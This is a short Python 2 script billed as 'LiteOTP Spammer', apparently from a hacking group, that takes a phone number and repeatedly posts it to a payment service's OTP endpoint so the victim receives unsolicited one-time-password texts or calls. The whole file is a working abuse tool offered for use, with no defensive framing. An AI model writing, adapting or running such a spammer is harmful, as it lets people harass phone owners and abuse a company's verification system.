## lite.py - LiteOTP SPAM (13-March-2018 [19:00])
# -*- coding: utf-8 -*-
##
import sys
import time
import requests

__banner__ = """
   _  _  _  _  _  _  _
  / \/ \/ \/ \/ \/ \/ \  LiteOTP Spammer v1.0
 ( L  i  t  e  O  T  P ) Author: DedSecTL
  \ /\_/\ /\_/\ /\_/\ /  Codename: Alone.
  / \   / \   / \   / \  Github: https://github.com/Gameye98
 ( s ) ( p ) ( a ) ( m ) Team  : BlackHole Security
  \_/   \_/   \_/   \_/  Made with full of \033[1;31m<3\033[0m
"""

def spam():
	options=sys.argv[1]
	phone=sys.argv[2]
	if sys.argv[1] == "--sms":
		print __banner__
		param = {'msisdn':''+sys.argv[2],'accept':''}
		count = 0
		while (count < 2):
			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
			if "otp_attempt_left" in r.text:
				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 60 second...\033[0m")
			else:
				print("\033[1;31m[FAILED] Send Failed...Sleep for 60 second...\033[0m")
			time.sleep(60)
			count = count + 1
		print("\033[1;33m[ DONE ] Stopped...\033[0m")
		sys.exit(1)
	elif sys.argv[1] == "--call":
		print __banner__
		param = {'msisdn':''+sys.argv[2],'accept':'call'}
		count = 0
		while (count < 3):
			r = requests.post('https://www.tokocash.com/oauth/otp', data=param)
			if "otp_attempt_left" in r.text:
				print("\033[1;32m[  OK  ] Send Succesful...Sleep for 60 second...\033[0m")
			else:
				print("\033[1;31m[FAILED] Send Failed...Sleep for 60 second...\033[0m")
			time.sleep(60)
			count = count + 1
		print("\033[1;33m[ DONE ] Stopped...")
		sys.exit(1)
	else:
		print __banner__
		print "Usage: lite.py [--sms/--call] PHONE"
		print "lite.py: error: %s option requires an argument" %options
		sys.exit()

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print __banner__
		print "Usage: lite.py [--sms/--call] PHONE"
		sys.exit(0)
	else:
		spam()